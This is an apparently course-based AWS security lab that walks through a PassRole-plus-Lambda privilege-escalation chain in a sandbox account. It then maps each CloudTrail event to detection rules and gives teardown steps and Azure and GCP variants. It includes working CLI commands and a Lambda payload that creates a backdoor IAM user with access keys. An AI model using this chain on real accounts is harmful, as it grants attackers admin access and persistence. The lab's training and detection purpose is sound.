# Lab 01 — Linchpin Lab: Full Chain in Your Sandbox

> **Level:** Advanced
> **Prereqs:** 09-01..09-07
> **Clouds:** AWS (primary) — Azure/GCP adaptations noted
**Authorization scope:** Run only in your own sandbox AWS account. All ARNs, account IDs, and resource names are placeholders. Destroy everything at the end.

## Overview

This lab walks you through a complete attack chain in your own sandbox: reconnaissance, creating a deliberately vulnerable role, escalating via `PassRole`+Lambda, and capturing every CloudTrail event along the way. At each step, you answer: *which detection rule would have caught this?*

## Architecture

```
Your sandbox account (111111111111)
├── linchpin-user (IAM user, limited perms)
├── linchpin-vuln-role (role with iam:PassRole on lambda-admin + lambda:CreateFunction)
├── lambda-admin-role (role with AdministratorAccess, trust Lambda service)
├── linchpin-lambda (Lambda function using lambda-admin-role)
│   └── Creates backdoor IAM user via AdministratorAccess
└── All activity captured in CloudTrail
```

## Pre-requisites

- AWS sandbox account with admin access
- AWS CLI configured
- `jq` installed
- CloudTrail enabled (enabled by default in all accounts; verify)

## Step 1: Verify Environment

```bash
# Confirm you're in the right account
aws sts get-caller-identity
# {"Account": "111111111111", "Arn": "arn:aws:iam::111111111111:user/admin"}

# Verify CloudTrail is running
aws cloudtrail describe-trails --query 'trailList[0].{Name:Name,Status:Status}'
# {"Name": "management-events", "Status": "IsLogging"}
```

## Step 2: Recon (Read-Only Enumeration)

Using your existing admin credentials, simulate what an attacker discovers during recon.

```bash
# Who am I?
aws sts get-caller-identity

# What roles exist and who trusts them?
aws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument.Statement[].Principal}' --output table

# What users exist?
aws iam list-users --query 'Users[].{Name:UserName,Id:UserId,Created:CreateDate}' --output table

# Are we in an organization?
aws organizations describe-organization 2>/dev/null || echo "Not in an organization"

# What S3 buckets exist?
aws s3 ls 2>/dev/null || echo "No buckets or insufficient permissions"
```

**Capture:** Note the `eventTime` and your source IP. After Step 6, you'll find these exact events in CloudTrail.

## Step 3: Create Deliberately Over-Permissioned Role

Create the "vulnerable" attack path:

### 3a: Create Lambda admin role

```bash
aws iam create-role \
  --role-name linchpin-lambda-admin \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"Service": "lambda.amazonaws.com"},
      "Action": "sts:AssumeRole"
    }]
  }'

aws iam attach-role-policy \
  --role-name linchpin-lambda-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 3b: Create the vulnerable role

```bash
# This role has PassRole to the admin role AND can create Lambda functions.
# This is a classic "negative grant" — the role itself is limited, but can
# launch a Lambda that runs as full AdministratorAccess.
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

aws iam create-role \
  --role-name linchpin-vuln-role \
  --assume-role-policy-document "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [{
      \"Effect\": \"Allow\",
      \"Principal\": {\"AWS\": \"arn:aws:iam::${ACCOUNT_ID}:root\"},
      \"Action\": \"sts:AssumeRole\"
    }]
  }"

aws iam put-role-policy \
  --role-name linchpin-vuln-role \
  --policy-name vuln-policy \
  --policy-document "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [
      {
        \"Effect\": \"Allow\",
        \"Action\": \"iam:PassRole\",
        \"Resource\": \"arn:aws:iam::${ACCOUNT_ID}:role/linchpin-lambda-admin\"
      },
      {
        \"Effect\": \"Allow\",
        \"Action\": \"lambda:CreateFunction\",
        \"Resource\": \"*\"
      },
      {
        \"Effect\": \"Allow\",
        \"Action\": \"lambda:InvokeFunction\",
        \"Resource\": \"*\"
      },
      {
        \"Effect\": \"Allow\",
        \"Action\": \"lambda:GetFunction\",
        \"Resource\": \"*\"
      }
    ]
  }"
```

## Step 4: Assume the Vulnerable Role

```bash
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/linchpin-vuln-role \
  --role-session-name linchpin-attack \
  --query 'Credentials' --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')

# Verify you're now the vulnerable role
aws sts get-caller-identity
# Arn should end with: assumed-role/linchpin-vuln-role/linchpin-attack

# Verify you have PassRole + CreateFunction
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:role/linchpin-vuln-role \
  --action-names iam:PassRole lambda:CreateFunction lambda:InvokeFunction \
  --query 'EvaluationResults[].{Action:EvalActionName,Decision:EvalDecision}' \
  --output table
# Should show: allowed, allowed, allowed
```

## Step 5: Escalate via PassRole + Lambda

```bash
# Create the Lambda payload — code that creates a backdoor user
mkdir -p /tmp/linchpin-payload
cat > /tmp/linchpin-payload/index.py << 'PYEOF'
import boto3
import time

def handler(event, context):
    iam = boto3.client('iam')
    backdoor_user = 'linchpin-backdoor'
    try:
        # Check if user already exists
        iam.get_user(UserName=backdoor_user)
        print(f"User {backdoor_user} already exists")
        return f"User {backdoor_user} already exists"
    except iam.exceptions.NoSuchEntityException:
        iam.create_user(UserName=backdoor_user)
        time.sleep(5)  # wait for propagation
        key = iam.create_access_key(UserName=backdoor_user)
        print(f"Created user {backdoor_user} with access key {key['AccessKey']['AccessKeyId']}")
        return f"Escalation complete: user {backdoor_user} created"
PYEOF

cd /tmp/linchpin-payload && zip -r /tmp/linchpin-function.zip index.py

# Create the Lambda with the ADMIN role (this is the PassRole escalation)
aws lambda create-function \
  --function-name linchpin-lambda \
  --runtime python3.9 \
  --role arn:aws:iam::${ACCOUNT_ID}:role/linchpin-lambda-admin \
  --handler index.handler \
  --zip-file fileb:///tmp/linchpin-function.zip \
  --timeout 30

# Invoke it — this runs as lambda-admin (AdministratorAccess)
aws lambda invoke --function-name linchpin-lambda /tmp/output.txt
cat /tmp/output.txt
# "Escalation complete: user linchpin-backdoor created"

# Verify the backdoor
aws iam list-access-keys --user-name linchpin-backdoor
```

**Privilege escalation complete.** The `linchpin-vuln-role` had limited perms, but it:
1. Passed `linchpin-lambda-admin` to Lambda
2. Created a Lambda that runs as AdministratorAccess
3. The Lambda created a backdoor IAM user

## Step 6: Capture CloudTrail Events

Wait ~2 minutes for CloudTrail delivery, then find the events:

```bash
sleep 120

echo "=== Step 2 — Recon events ==="
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ListRoles \
  --max-results 3 --query 'Events[].{Time:EventTime,Event:EventName,User:Username}' --output table

echo "=== Step 3 — Role creation events ==="
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateRole \
  --max-results 3 --query 'Events[].{Time:EventTime,Event:EventName,Role:CloudTrailEvent}' --output text | head -20

echo "=== Step 3 — Policy attachment ==="
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AttachRolePolicy \
  --max-results 3 --query 'Events[].{Time:EventTime,Event:EventName}' --output table

echo "=== Step 4 — AssumeRole ==="
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --max-results 3 --query 'Events[].{Time:EventTime,Event:EventName,User:Username}' --output table

echo "=== Step 5 — CreateFunction ==="
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateFunction20150331 \
  --max-results 3 --query 'Events[].{Time:EventTime,Event:EventName}' --output table

echo "=== Step 5 — CreateUser (by Lambda) ==="
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser \
  --max-results 3 --query 'Events[].{Time:EventTime,Event:EventName}' --output table

echo "=== Step 5 — CreateAccessKey (by Lambda) ==="
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --max-results 3 --query 'Events[].{Time:EventTime,Event:EventName}' --output table
```

## Step 7: Map Events to Detection Rules

Complete this table based on your CloudTrail event observations:

| Event # | eventName | Principal | Detection Rule That Catches It |
|---|---|---|---|
| 1 | `ListRoles` | `your-admin-user` | CloudTrail `List*` burst alert (09-02) |
| 2 | `CreateRole` | `your-admin-user` | `CreateRole` alert (09-07) |
| 3 | `PutRolePolicy` | `your-admin-user` | IAM policy change alert |
| 4 | `AssumeRole` | `linchpin-vuln-role` → `linchpin-attack` | `AssumeRole` without MFA (09-05) |
| 5 | `CreateFunction20150331` | `linchpin-vuln-role/linchpin-attack` | Lambda created with admin role (09-05) |
| 6 | `InvokeFunction` | Lambda service | `InvokeFunction` data event (09-08) |
| 7 | `CreateUser` | `linchpin-lambda-admin` (assumed by Lambda) | New IAM user outside CI (09-07) |
| 8 | `CreateAccessKey` | `linchpin-lambda-admin` (assumed by Lambda) | `CreateAccessKey` for IAM user (09-07) |

**Key observation:** The chain involves 4 different principals:
1. `admin` (your user — setup)
2. `linchpin-vuln-role/linchpin-attack` (assumed role — escalation trigger)
3. `linchpin-lambda-admin` (Lambda execution role — the privilege target)
4. Lambda service itself (invoke)

Defenders must correlate across principals to detect the full chain.

## Step 8: Teardown

```bash
# Unset the vulnerable session
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

# Delete the backdoor user's access key and the user
BACKDOOR_KEY=$(aws iam list-access-keys --user-name linchpin-backdoor --query 'AccessKeyMetadata[0].AccessKeyId' --output text 2>/dev/null)
if [ -n "$BACKDOOR_KEY" ] && [ "$BACKDOOR_KEY" != "None" ]; then
  aws iam delete-access-key --user-name linchpin-backdoor --access-key-id "$BACKDOOR_KEY"
fi
aws iam delete-user --user-name linchpin-backdoor 2>/dev/null

# Delete the Lambda function
aws lambda delete-function --function-name linchpin-lambda 2>/dev/null

# Delete the vulnerable role's inline policy and the role
aws iam delete-role-policy --role-name linchpin-vuln-role --policy-name vuln-policy 2>/dev/null
aws iam delete-role --role-name linchpin-vuln-role 2>/dev/null

# Delete the Lambda admin role
aws iam detach-role-policy --role-name linchpin-lambda-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null
aws iam delete-role --role-name linchpin-lambda-admin 2>/dev/null

# Clean temp files
rm -rf /tmp/linchpin-payload /tmp/linchpin-function.zip /tmp/output.txt

echo "Teardown complete. Verify no resources remain:"
aws iam list-roles --query "Roles[?contains(RoleName,'linchpin')].RoleName"
aws iam list-users --query "Users[?contains(UserName,'linchpin')].UserName"
aws lambda list-functions --query "Functions[?contains(FunctionName,'linchpin')].FunctionName"
# All should return empty lists
```

## Azure Adaptation

For Azure, the equivalent chain:
1. **Recon:** `az ad user list`, `az ad sp list`, `az role assignment list --all`
2. **Vulnerable setup:** Create a user with `Application Administrator` role
3. **Escalation:** Application Administrator adds a password credential to a privileged SP → authenticates as that SP → gains its roles
4. **Detection:** Azure AD audit logs for `Add password credential` + `Service principal sign-in`

## GCP Adaptation

For GCP, the equivalent chain:
1. **Recon:** `gcloud projects get-iam-policy`, `gcloud iam service-accounts list`
2. **Vulnerable setup:** SA with `iam.serviceAccounts.getAccessToken` on a privileged SA
3. **Escalation:** `gcloud auth print-access-token --impersonate-service-account=privileged-sa@...`
4. **Detection:** Cloud Audit Log `GenerateAccessToken` on privileged SA

## References

- [09-05-privilege-escalation-catalogue.md](../privilege-escalation-catalogue.md)
- [09-07-persistence-techniques-in-cloud.md](../persistence-techniques-in-cloud.md)
- [09-08-evasion-and-trail-free-actions.md](../evasion-and-trail-free-actions.md)
- [AWS IAM PassRole](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html)
